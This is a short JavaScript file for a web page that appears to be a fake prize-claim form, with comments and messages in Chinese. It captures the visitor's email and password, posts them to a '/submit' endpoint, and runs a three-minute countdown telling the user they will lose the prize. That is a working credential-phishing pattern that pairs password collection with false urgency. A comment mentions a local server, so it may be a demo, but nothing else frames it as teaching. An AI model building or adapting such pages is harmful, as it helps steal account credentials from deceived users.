document.getElementById("claimForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // 提交資料到本地端伺服器
    fetch("/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password })
    })
        .then(res => res.text())
        .then(msg => {
            alert("伺服器回應：" + msg);
        })
        .catch(err => {
            alert("發生錯誤：" + err.message);
        });
});

// 倒數計時器邏輯
let remainingTime = 180;
const countdownDisplay = document.getElementById("countdown");
const submitBtn = document.getElementById("submitBtn");

const timer = setInterval(() => {
    let minutes = Math.floor(remainingTime / 60);
    let seconds = remainingTime % 60;
    countdownDisplay.textContent = `剩餘時間：${minutes}:${seconds.toString().padStart(2, '0')}`;

    if (remainingTime <= 0) {
        clearInterval(timer);
        countdownDisplay.textContent = "時間已到，您未能完成領獎！";
        submitBtn.disabled = true;
        submitBtn.style.backgroundColor = "#ccc";
        submitBtn.style.cursor = "not-allowed";
    }

    remainingTime--;
}, 1000);
